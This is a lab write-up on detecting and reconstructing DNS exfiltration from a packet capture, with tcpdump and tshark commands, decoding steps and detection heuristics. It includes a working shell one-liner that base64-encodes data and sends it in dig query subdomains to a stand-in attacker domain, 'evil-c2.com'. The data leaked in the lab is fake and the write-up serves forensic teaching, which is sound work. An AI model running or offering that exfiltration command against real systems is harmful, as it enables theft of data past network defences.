# 04 DNS Exfiltration (T1048)

Reconstructing exfiltrated data from a raw packet capture by recognizing the DNS exfil pattern, extracting the encoded query names, and decoding them back to the exact data that left the network. This is the most complete of the four scenarios because it does not just detect the exfil, it proves precisely what was stolen.

| Field | Value |
|---|---|
| Technique | T1048 Exfiltration Over Alternative Protocol |
| Source | Kali Linux, 192.168.64.15, the compromised host leaking data |
| Destination | evil-c2.com, attacker controlled domain (queries aimed at 192.168.64.12) |
| Capture | `dns-exfil.pcap`, 5 packets, ~700 bytes |
| Data recovered | `SSN:123-45-6789 CardNumber:4111111111111111 Password:SuperSecret` |

---

## Why DNS

DNS is the trusted protocol. Almost every network allows DNS out freely because name resolution is required for everything to work, and DNS traffic is rarely inspected closely. Attackers abuse exactly that trust. They encode stolen data into the subdomain of a query aimed at a domain they control, and the data walks out disguised as ordinary name resolution.

## Attack

A simulated compromised host encodes fake sensitive data, splits it into DNS label sized chunks, and sends each chunk as a query subdomain:

```
for chunk in $(echo "SSN:123-45-6789 CardNumber:4111111111111111 Password:SuperSecret" | base64 | fold -w20); do dig @192.168.64.12 $chunk.exfil.evil-c2.com +short +time=1 +tries=1; done
```

The data is base64 encoded so it survives inside a DNS legal name, then folded into 20 character chunks because DNS labels have length limits. Each chunk rides in the leading label of a query to `exfil.evil-c2.com`. The queries do not need to resolve. The exfiltration is complete the moment the query leaves the host, because the data is in the query name itself.

## Capture setup

Captured on the wire between the two hosts with tcpdump, scoped to DNS only:

```
sudo tcpdump -i enp0s1 -w dns-exfil.pcap host 192.168.64.15 and host 192.168.64.12 and port 53
```

`capinfos` shows 5 packets at an average size of 118 bytes, larger than a normal DNS query because the query name is stuffed with encoded data. That size inflation is itself a tell.

## What the packets revealed

Extracting the query names from the capture shows the raw exfil strings:

```
tshark -r dns-exfil.pcap -Y "dns.flags.response == 0" -T fields -e dns.qry.name
```

Output:

```
U1NOOjEyMy00NS02Nzg5.exfil.evil-c2.com
IENhcmROdW1iZXI6NDEx.exfil.evil-c2.com
MTExMTExMTExMTExMSBQ.exfil.evil-c2.com
YXNzd29yZDpTdXBl.exfil.evil-c2.com
clNlY3JldAo=.exfil.evil-c2.com
```

Then the reconstruction. Strip the domain suffix, join the chunks, and decode:

```
tshark -r dns-exfil.pcap -Y "dns.flags.response == 0" -T fields -e dns.qry.name | sed 's/.exfil.evil-c2.com//' | tr -d '\n' | base64 -d
```

Output:

```
SSN:123-45-6789 CardNumber:4111111111111111 Password:SuperSecret
```

The exact data that left the network, recovered from the packets alone. In an incident this is the difference between "data may have been exfiltrated" and "here is precisely what was stolen," which drives breach scope, severity, and notification.

## Detection takeaway

DNS exfiltration is dangerous because DNS is trusted and rarely inspected. The detectable artifacts, all present in this capture:

Abnormally long query names. The subdomains carried 20 characters of encoded data each, far longer than normal short hostnames.

High entropy subdomains. The base64 labels look like random gibberish, not pronounceable dictionary like hostnames. Real domains read like words, encoded data does not.

Repeated queries to one domain. Five queries to a single second level domain in four seconds. Normal DNS is varied across many domains, exfil is a steady stream to one.

Consistent structure. A fixed `<data>.exfil.evil-c2.com` pattern where only the leading label changes.

Detection logic: alert on DNS queries where the query name length or subdomain entropy exceeds a threshold, or where query volume to a single second level domain spikes over a short window. This is the network side of the same detection covered host side by Sysmon Event ID 22, DNS query logging, which catches the queries at the endpoint before they leave.

Maps to T1048, Exfiltration Over Alternative Protocol.

## The reusable pattern

1. Spot the anomaly, long or high entropy DNS query names, or volume to one domain.
2. Extract the query names from the capture, filter for queries not responses.
3. Strip the attacker domain suffix to isolate the encoded payload.
4. Decode to recover exactly what was exfiltrated.
5. Report the leaked data, the destination domain, and recommend DNS query inspection or egress controls.
